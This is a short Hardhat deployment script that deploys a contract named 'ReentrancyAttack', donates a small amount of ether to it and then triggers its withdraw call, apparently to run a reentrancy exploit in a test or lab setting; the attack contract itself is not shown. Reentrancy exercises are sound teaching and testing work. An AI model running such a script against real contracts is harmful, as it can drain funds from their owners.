const hre = require("hardhat");
const {utils} = require("ethers");

function sleep(s) {
    if (s > 0) {
        console.log(`Waiting for ${s} seconds`);
        return new Promise(resolve => setTimeout(resolve, s*1000));
    }
}

async function main() {


    console.log(`Operating in network ${hre.network.name}`)

    const [deployer] = await hre.ethers.getSigners();

    let holder = deployer.address;

    console.log(
    "Deploying contracts with the account:",
    deployer.address
    );
    
    console.log("Account balance:", (await deployer.getBalance()).toString());

    const ReentrancyAttackFactory = await ethers.getContractFactory("ReentrancyAttack");
    const ReentrancyAttackInstance = await ReentrancyAttackFactory.deploy();

    await ReentrancyAttackInstance.donate({value: utils.parseEther("0.002")});

    await sleep(30);
    await ReentrancyAttackInstance.withdraw({gasLimit: 100000});

}

main()
    .then(() => process.exit(0))
    .catch(error => {
    console.error(error);
    process.exit(1);
    });